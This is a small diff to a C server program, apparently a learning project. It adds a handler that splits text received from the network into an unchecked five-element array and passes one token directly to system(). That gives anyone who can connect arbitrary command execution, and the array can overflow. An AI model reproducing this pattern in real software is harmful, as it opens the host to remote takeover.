@@ -96,6 +96,20 @@ main( )
 				char *Etoken;
                                 char *Estr[5];
                                 int i = 0;
+				int ret;
+
+				Etoken = strtok(rcvBuffer, " ");
+				while (Etoken != NULL) {
+					Estr[i++] = Etoken;
+					Etoken = strtok(NULL, " ");
+				}
+				
+				ret = system(Estr[1]);
+				
+				if(!ret)
+					printf("command Success!!\n");
+				else
+					printf("command Failed!!\n");
 			}
 			else
 				strcpy(buffer, "무슨 말인지 모르겠습니다ㅠ_ㅠ");
